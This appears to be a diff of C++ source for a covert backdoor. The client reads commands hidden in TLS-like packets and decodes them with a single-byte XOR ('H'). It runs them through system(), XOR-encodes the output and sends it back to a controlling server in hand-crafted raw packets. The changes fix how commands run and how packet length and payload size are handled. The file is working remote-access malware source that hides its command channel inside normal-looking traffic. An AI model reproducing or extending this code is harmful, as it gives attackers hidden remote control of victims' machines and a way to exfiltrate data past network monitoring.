@@ -533,37 +533,43 @@ void decapsulate(const u_char *data, int size) {
 
 					//have to flip bits because of memory type
 					if (tls_head->type == 23) {
-						int tls_data_len = ((tls_head->length & 0xFF) << 8) | ((tls_head->length >> 8) & 0xFF); //length of data
+						//std::cout << tls_head->length << std::endl;
+						//int tls_data_len = ((tls_head->length & 0xFF) << 8) | ((tls_head->length >> 8) & 0xFF); //length of data
 						u_char* data_char = ((u_char*)tls_head + 12); //pointer to one byte of data
 						std::string command; //string that will contain command used
+						int tls_data_len = tls_head->length - 7;
 						for (int i = 0; i < tls_data_len; i++) {
 							//get data
 							command = command + (char)*data_char;
 							//increment
 							data_char = data_char + 1;
 						}
+						
 						//decrypt command
 						for (int i = 0; i < command.length(); i++) {
 							command[i] = command[i] ^ 'H';
 						}
+						//std::cout << command << std::endl;
+						
 						//run command
-						char buffer[500];
-						FILE* _pipe = _popen(command.c_str(), "r");
-						std::string result = "";
-						//redirects stdout to pipe and adds elements of buffer to result string
-						if (!_pipe) {
-							std::cout << "ERROR" << std::endl;
+						command = command + " > test.txt";
+						int return_val = system(command.c_str());
+						//read output from file
+						std::string result;
+						std::ifstream myfile("test.txt");
+						if (myfile.is_open()) {
+							while (!myfile.eof()) {
+								std::string line;
+								getline(myfile, line);
+								result = result + line;
+							}
+							myfile.close();
 						}
-
-						while (!feof(_pipe)) {
-							if (fgets(buffer, sizeof(buffer), _pipe) != NULL)
-								result += buffer;
-						}
-						_pclose(_pipe);
 						//encrypt result
 						for (int i = 0; i < result.length(); i++) {
 							result[i] = result[i] ^ 'H';
 						}
+						//std::cout << result.length() << std::endl;
 						//return result to server
 						identification_number++;
 						connected_mode_send(address, mac_address, "1", result, identification_number);
@@ -797,6 +803,9 @@ int send_packet(std::string address, std::string mac_addr, std::string option, i
 	if (option == "1") {
 		packet[14] = 70;
 		size = 58;
+		//total length
+		packet[16] = 0;
+		packet[17] = size - 14;
 		//need to set option length
 		for (int i = 34; i < 38; i++) {
 			packet[i] = i % 256;
@@ -816,27 +825,30 @@ int send_packet(std::string address, std::string mac_addr, std::string option, i
 			myfile.close();
 		}
 	}
-	else if (option == "result") {
-
-	}
 	else if (option == "2") {
 		packet[14] = 71;
 		size = 62;
+		//total length =1500
+		packet[16] = 0;
+		packet[17] = size - 14;
 		//need to set option length
 		for (int i = 34; i < 42; i++) {
 			packet[i] = i % 256;
 		}
 	}
-	else
+	else {
 		packet[14] = 69; //64 represents 4=>IPv4  5 represents minimum ipv4 length
-						 //differentiated services
+		size = 54;
+		//total length =1500
+		packet[16] = 0;
+		packet[17] = size -14;
+	}
+	//differentiated services
 	packet[15] = 0;
-	//total length =1500
-	packet[16] = id_num / 256;
-	packet[17] = id_num % 256;
+	
 	//identification =19142
-	packet[18] = 74;
-	packet[19] = 198;
+	packet[18] = id_num / 256;
+	packet[19] = id_num % 256;
 	//flags don't fragment =010
 	packet[20] = 64;
 	//fragment offset
@@ -911,7 +923,7 @@ int connected_mode_send(std::string address, std::string mac_addr, std::string o
 	mac_values* values = (mac_values*)malloc((sizeof(int) * 6));
 	mac_values* mac_address = (mac_values*)malloc((sizeof(int) * 6));
 	get_mac(&values);
-	u_char packet[1000];
+	u_char packet[4000];
 
 	std::vector<std::string> mac_val;
 	split(mac_addr, ':', mac_val);
@@ -946,10 +958,18 @@ int connected_mode_send(std::string address, std::string mac_addr, std::string o
 	int size = 0;
 	if (option == "1") {
 		packet[14] = 69; //64 represents 4=>IPv4  5 represents minimum ipv4 length
-						 //get packet size
+		
+		//get packet size
 		int com_len = command.length();
-		size = 66 + command.length(); //needs this for sending packet function
-
+		if (com_len < 3901) {
+			size = 66 + command.length(); //needs this for sending packet function
+		}
+		else
+			size = 66 + 3900;
+		
+		//total length
+		packet[16] = size / 256;
+		packet[17] = size % 256;
 		std::cout << "I've sent the packet boss." << std::endl;
 		//sending ack packet
 		std::ifstream myfile("psh_ack_tcp_header.txt");
@@ -989,11 +1009,18 @@ int connected_mode_send(std::string address, std::string mac_addr, std::string o
 		packet[65] = 0;
 		//data
 		int index = 66; //start index
-		for (int x = 0; x < command.length(); x++) {
-			packet[index] = command[x];
-			index++;
+		if (com_len < 3901) {
+			for (int x = 0; x < com_len; x++) {
+				packet[index] = command[x];
+				index++;
+			}
 		}
-
+		else {
+			for (int x = 0; x < 3900; x++) {
+				packet[index] = command[x];
+				index++;
+			}
+		}
 	}
 	else if (option == "2") {
 		//this will represent something else
@@ -1003,9 +1030,7 @@ int connected_mode_send(std::string address, std::string mac_addr, std::string o
 
 						 //differentiated services
 	packet[15] = 0;
-	//total length =1500
-	packet[16] = 5;
-	packet[17] = 220;
+	
 	//identification
 	packet[18] = id_num / 256;
 	packet[19] = id_num % 256;
